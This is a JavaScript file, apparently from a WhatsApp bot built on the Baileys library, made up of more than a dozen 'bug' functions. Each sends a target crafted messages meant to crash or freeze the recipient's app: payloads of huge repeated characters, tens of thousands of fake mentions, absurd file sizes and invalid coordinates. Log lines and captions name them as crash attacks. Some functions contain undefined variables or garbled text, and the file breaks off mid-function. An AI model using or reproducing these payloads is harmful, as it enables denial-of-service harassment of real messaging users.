// bugTools.js
const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
const chalk = require("chalk");
const crypto = require("crypto");
const fs = require("fs");

// Jangan ubah fungsi ini — ia disalin 100% sama seperti dalam index.js
// ===========================

async function InVisibleX(sock, jid, mention) {
            let msg = await generateWAMessageFromContent(jid, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "@raysofhopee",
                    footerText: "vip",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "HADES VIP!" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: jid },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (mention) {
                await sock.relayMessage(
                    jid,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "hmmm",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }

async function IMGCRL(sock, jid) {
let cards = [];

for (let r = 0; r < 1000; r++) {
cards.push({
body: { text: '📜 • 𝐑𝐀𝐋𝐃𝐙𝐙 𝐌𝐄𝐒𝐒𝐀𝐆𝐄' },
header: {
title: ' ',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "107374182400",
height: 9999,
width: 9999,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '%'.repeat(99999),
buttons: [
{
name: "cta_call",
buttonParamsJson: JSON.stringify({ status: 9999 })
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({ status: 9999 })
}
]
}
});
}

let msg = await generateWAMessageFromContent(jid, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: 'ꦾ'.repeat(60000) },
footer: { text: '© !𝗌`𝗋𝖺𝗅𝖽𝗓𝗓 𝗑𝗒𝗓 ' },
carouselMessage: {
cards: cards
},
contextInfo: {
participant: "0@s.whatsapp.net",
remoteJid: "@s.whatsapp.net",
mentionedJid: [
target,
...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
],
}
}
}
}
}, {});

await sock.relayMessage(jid, msg.message, {
participant: { jid: jid },
messageId: msg.key.id
});
}

async function potterinvis(sock, jid, mention) {
 console.log(chalk.green("Berhasil mengirim Bug Potter Invictus⚡"));
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "🐉 𝐏𝐎𝐓𝐓𝐄𝐑 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 🐉",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, generateMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      jid,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "potter is back" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function callNewsletter(sock, jid) {
await sock.relayMessage(jid, {
callLogMesssage: { isVideo: true, callOutcome: "REJECTED", durationSecs: "1", callType: "VOICE_CHAT", participants: [{ jid: jid, callOutcome: "CONNECTED" }, { jid: "0@s.whatsapp.net", callOutcome: "CONNECTED" }]}
}, {})
}

async function crashNewsletter(sock, jid) {
  const msg = generateWAMessageFromContent(jid, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "F*ucking Everyone"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "".repeat(10000) 
      }
   }
  }, { userJid: jid });

  await sock.relayMessage(jid, msg.message, { 
    participant: { jid: jid },
    messageId: msg.key.id 
  });
}

async function VcardXFc(sock, jid) {
  const apiClient = JSON.stringify({
    status: true,
    criador: "Carinho",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Tama Ryuichi | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "€ 𝗧𝗮𝗺𝗮 𝗥𝘆𝘂𝗶𝗰𝗵𝗶",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: jid,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              title: "\u200B".repeat(10000),
              body: "GIDEOVA_PAYMENT_STATUSED"
            }),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: apiClient + "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: apiClient + "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "payment_status",
                buttonParamsJson: ""
              },
              {
                name: "review_order",
                buttonParamsJson: JSON.stringify({
                  reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
                  order: {
                    status: "pending",
                    order_type: "ORDER"
                  },
                  share_payment_status: true,
                  call_permission: true
                })
              },
              {
                name: "contact",
                buttonParamsJson: JSON.stringify({
                  vcard: {
                    full_name: "Zephyrine Chema ".repeat(4000),
                    phone_number: "+628217973312",
                    email: "zephyrineexploit@iCloud.com",
                    organization: "Zephyrine Exploiter",
                    job_title: "Customer Support"
                  }
                })
              }
            ]
          }
        }
      }
    }
  }, { userJid: jid });

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
}
        async function XdelayTrash(sock, jid, mention) { 
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "sayonara...",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Hp Kentang Dilarang Coba²"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "kontol lor" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
        async function LocaBetanew2(sock, jid, mention) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: { 
              text: `‌𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟᪳ 𝐈‌𝐧‌𝐟𝐢𝐧‌𝐢‌𝐭𝐲${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  } catch (err) {
    console.log(err);
  }
}
async function BetaUI(sock, jid, Ptcp = false) {
let virtex =  `조로Nted Crash Gen6🐉버그\n${"ꦾ".repeat(107777)}`;
            await sock.relayMessage(jid, {
                    ephemeralMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                        fileLength: "109951162777600",
                                        pageCount: 9999999999,
                                        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                        fileName: "\u0003".repeat(100),
                                        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1726867151",
                                        contactVcard: true,
                                        jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                                    },
                                    hasMediaAttachment: true,
                                },
                                body: {
                                    text: virtex,
                                },
                                nativeFlowMessage: {
                                name: "call_permission_request",
                                messageParamsJson: "\u0000".repeat(5000),
                                },
                                contextInfo: {
                                mentionedJid: [jid],
                                    forwardingScore: 1,
                                    isForwarded: true,
                                    fromMe: false,
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "status@broadcast",
                                    quotedMessage: {
                                        documentMessage: {
                                            url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                            fileLength: "9999999999999",
                                            pageCount: 9999999999999,
                                            mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                            fileName: "Bokep 18+",
                                            fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                            directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                            mediaKeyTimestamp: "1724474503",
                                            contactVcard: true,
                                            thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                            thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                            thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                            jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                                        },
                                    },
                                },
                            },
                        },
                    },
                },
                Ptcp ? {
                    participant: {
                        jid: jid
                    }
                } : {}
            );
    };

async function CrashXUiKiller(sock, jid, ptcp = true) {
            let msg = await generateWAMessageFromContent(jid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "조로Nted Crash Gen6🐉버그",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "조로Nted Crash Gen6🐉버그" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: venomModsData + "ꦾ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: venomModsData + "ꦾ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(jid, msg.message, ptcp ? {
                participant: {
                    jid: jid
                }
            } : {});
        }
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function InVisiOneMess(sock, jid, qTed, Ztc, Ptcp) {
            let etc = generateWAMessageFromContent(jid,
                proto.Message.fromObject({
                    ephemeralMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "hello, and goodbye..馃寽踏",
                                      "locationMessage": {
                                      "degreesLatitude": -999.03499999999999,
                                      "degreesLongitude": 922.999999999999,
                                      "name": "馃悏",
                                      "address": "饾悊汀饾悶蜏饾悡饾悞态汀饾惍廷饾悧釐濔潗? 鈲ａ碂 饾悁谈饾悽廷饾悽汀饾悵蜏饾悎蜐廷饾悅銆斤笍",
                                      "jpegThumbnail": Ztc
                                    },
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: ""
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: "{".repeat(10000),
                                    buttons: [],
                                },
                            }
                        }
                    }
                }), {
                    userJid: jid,
                    quoted: qTed
                }
            );
            await sock.relayMessage(jid, etc.message, Ptcp ? {
                participant: {
                    jid: jid
                }
            } : {});
            console.log(chalk.green("# D3parted - Echoes In Void Sent馃幁"));
        };

async function XProto3V2(sock, jid, mention) {
    const protoMessage = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "𝕷𝖎𝖍𝖃 𝖃𝖛𝖎𝖕" + "🥶".repeat(101),
                    height: 10,
                    width: 101,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "99988877766@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "uknown",
                                    songId: "870166291800508",
                                    author: "𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝟑" + "᭱".repeat(9999),
                                    title: "𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://t.me/FunctionLihX",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", protoMessage.message, {
        messageId: protoMessage.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: protoMessage.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}        

async function crashUiV5(sock, jid, Ptcp = false) {
    sock.relayMessage(jid, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "조로Nted Crash Gen6🐉버그" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "조로Nted Crash Gen6🐉버그"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: jid }, messageId: null });
};

async function VampDelayCrash(sock, jid) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "valores.cloud.net" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, message, { participant: { jid: jid } });
}

async function frezui(sock, jid) {
var msg = await generateWAMessageFromContent(jid, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "Please Look My Message\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb // di ubh ke null atau kosong string jg bs
          },
          hasMediaAttachment: true
        },
        body: {
          text: "lu y team" + "@1".repeat(90000) + "ꦾ".repeat(90000) + "\u0000"
          
        },
        nativeFlowMessage: {
          messageParamsJson: "\u0000".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: jid,  })
await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
}

async function CrashPayloadNew(sock, jid) {
    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
